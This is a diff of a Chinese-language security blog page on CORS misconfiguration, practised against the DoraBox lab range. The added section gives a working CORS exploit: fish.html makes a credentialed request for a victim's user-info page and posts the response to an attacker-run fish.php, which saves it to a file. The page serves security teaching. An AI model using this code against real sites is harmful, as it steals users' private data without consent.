@@ -290,12 +290,8 @@
 </br>
 
 <p>所谓同源是指：域名、协议、端口相同。</p>
-<p><a target="_blank" rel="noopener" href="http://www.atest.cn/test/index.html">http://www.atest.cn/test/index.html</a> 的同源检测结果</p>
+<p><a target="_blank" rel="noopener" href="http://www.test.cn/test/index.html">http://www.test.cn/test/index.html</a> 的同源检测结果</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210904175408.png"></p>
-</br>
-
-<h1 id="如何判断站点存在cors跨域漏洞"><a href="#如何判断站点存在cors跨域漏洞" class="headerlink" title="如何判断站点存在cors跨域漏洞"></a>如何判断站点存在cors跨域漏洞</h1><p>遇到Origin: <a target="_blank" rel="noopener" href="http://www.test.com,修改为http//www.aaa.com">http://www.test.com，修改为http://www.aaa.com</a></p>
-<p>查看下返回包，如果是<a target="_blank" rel="noopener" href="http://www.aaa.com/">http://www.aaa.com</a></p>
 </br>
 
 <h1 id="跨域限制的作用"><a href="#跨域限制的作用" class="headerlink" title="跨域限制的作用"></a>跨域限制的作用</h1><p>为了用户在上网期间，访问到一些站点，加载了其他站点的恶意脚本，使得被人恶意利用</p>
@@ -402,7 +398,7 @@
 
 </br>
 
-<h1 id="靶场演练"><a href="#靶场演练" class="headerlink" title="靶场演练"></a>靶场演练</h1><p><a target="_blank" rel="noopener" href="https://github.com/0verSp4ce/DoraBox">https://github.com/0verSp4ce/DoraBox</a></p>
+<h1 id="靶场演练"><a href="#靶场演练" class="headerlink" title="靶场演练"></a>靶场演练</h1><p>靶场：<a target="_blank" rel="noopener" href="https://github.com/0verSp4ce/DoraBox">https://github.com/0verSp4ce/DoraBox</a></p>
 <p>下载后修改config.php的数据库密码，并且创建pentest导入source xxx.sql文件</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210904210022.png"></p>
 <p>访问是一串user的信息</p>
@@ -416,6 +412,21 @@
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/cors2.png"></p>
 </br>
 
+<p><strong>钓鱼方式利用</strong></p>
+<p>发起两个xml请求，一个分别是带上参数将cookie等信息发送到我们的站上，一个是请求对方的敏感页面</p>
+<p>fish.html</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>cors exploit<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="javascript"></span>&#123;</span><br><span class="javascript">    <span class="hljs-keyword">var</span> xhr1;</span><br><span class="javascript">    <span class="hljs-keyword">var</span> xhr2;</span><br><span class="javascript">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">window</span>.XMLHttpRequest)</span><br><span class="javascript">    &#123;</span><br><span class="javascript">        xhr1 = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="javascript">        xhr2 = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    <span class="hljs-keyword">else</span></span><br><span class="javascript">    &#123;</span><br><span class="javascript">        xhr1 = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="javascript">        xhr2= <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    xhr1.onreadystatechange=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="javascript">    </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">if</span>(xhr1.readyState == <span class="hljs-number">4</span> &amp;&amp; xhr1.status == <span class="hljs-number">200</span>) </span><br><span class="javascript">        &#123;</span><br><span class="javascript">            <span class="hljs-keyword">var</span> datas=xhr1.responseText;</span><br><span class="javascript">            xhr2.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;http://192.168.101.114/fish.php&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);</span><br><span class="javascript">            xhr2.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="javascript">            xhr2.send(<span class="hljs-string">&quot;z0=&quot;</span>+<span class="hljs-built_in">escape</span>(datas));      </span><br><span class="javascript">        &#125;</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    xhr1.open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.101.108/csrf/userinfo.php&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>) </span><br><span class="javascript">    xhr1.withCredentials = <span class="hljs-literal">true</span>;        </span><br><span class="javascript">    xhr1.send();</span><br><span class="javascript">&#125;</span><br><span class="javascript">exploit();</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>fish.php</p>
+<p>我们的站点用来接收xml请求发送过来的数据，到secrect.html上</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$file</span> = fopen(<span class="hljs-string">&quot;secrect.html&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br>	<span class="hljs-variable">$res</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;z0&#x27;</span>];<br>	fwrite(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$res</span>);<br>	fclose(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+</br>
+
+<p>当用户访问到我们的fish.html文件上，我们就可以在secrect.html看到用户的信息</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20210904210046.png"></p>
 <p>参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/web_security_1/bhz8d8">https://www.yuque.com/pmiaowu/web_security_1/bhz8d8</a></p>
 <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yexudengzhidao/article/details/100104134">https://blog.csdn.net/yexudengzhidao/article/details/100104134</a></p>
 
